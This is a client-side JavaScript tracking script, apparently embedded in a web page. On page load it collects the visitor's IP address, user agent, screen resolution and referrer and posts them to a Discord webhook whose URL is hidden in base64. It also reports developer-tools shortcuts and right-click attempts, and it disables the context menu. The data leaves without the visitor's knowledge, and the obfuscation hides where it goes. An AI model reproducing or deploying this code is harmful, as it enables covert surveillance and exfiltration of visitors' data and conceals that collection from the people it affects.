// Encoded webhook URL
const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
const webhookURL = atob(encodedWebhookURL); // Decoding the URL

// Function to send user details to a Discord webhook as an embed
function sendUserDetailsToDiscord(details) {
    const data = {
        embeds: [{
            title: 'User Action Logged ✅ [NORMAL USER]',
            color: 0xff0000, // Red color
            description: details
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(() => console.log('Data sent to Discord'))
    .catch(error => console.error('Error sending data to Discord:', error));
}

// Log user details on page load
window.addEventListener('load', () => {
    // IP Address
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const userAgent = navigator.userAgent;
            const geolocation = navigator.geolocation;
            const cookiesEnabled = navigator.cookieEnabled;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const referrer = document.referrer;

            const details = `
                IP Address: ${ip}\n
                User Agent: ${userAgent}\n
                Geolocation: ${geolocation}\n
                Cookies Enabled: ${cookiesEnabled}\n
                Screen Resolution: ${screenResolution}\n
                Referrer URL: ${referrer}
            `;

            console.log('User Details:', details);

            sendUserDetailsToDiscord(details);
        })
        .catch(error => console.error('Error getting user details:', error));
});

// Add key event listener for Ctrl+Shift+J
document.addEventListener('keydown', function(event) {
    const key = event.key;
    const keyCombo = (event.ctrlKey ? 'Ctrl+' : '') + (event.shiftKey ? 'Shift+' : '') + key;
    if (keyCombo === 'Ctrl+Shift+I' || keyCombo === 'Ctrl+Shift+i') {
        sendUserDetailsToDiscord('User pressed Ctrl+Shift+I to open console');
    } else if (keyCombo === 'Ctrl+Shift+J' || keyCombo === 'Ctrl+Shift+j') {
        sendUserDetailsToDiscord('User pressed Ctrl+Shift+J to open element inspector');
    } else if (keyCombo === 'Ctrl+Shift+C' || keyCombo === 'Ctrl+Shift+c') {
        sendUserDetailsToDiscord('User pressed Ctrl+Shift+C to open element inspector');
    } else if (keyCombo === 'Ctrl+Shift+U' || keyCombo === 'Ctrl+Shift+u') {
        sendUserDetailsToDiscord('User pressed Ctrl+Shift+U to open element inspector');
    } else if (keyCombo === 'Ctrl+U' || keyCombo === 'Ctrl+u') {
        sendUserDetailsToDiscord('User pressed Ctrl+U to open element inspector');
    } else if (keyCombo === 'F12') {
        sendUserDetailsToDiscord('User pressed F12 to open element inspector');
    }
    // Add other key combinations as needed
});

// Add contextmenu event listener for right-click
document.addEventListener('contextmenu', function(event) {
    sendUserDetailsToDiscord('User attempted to right-click');
    event.preventDefault(); // Prevent the default right-click behavior
});
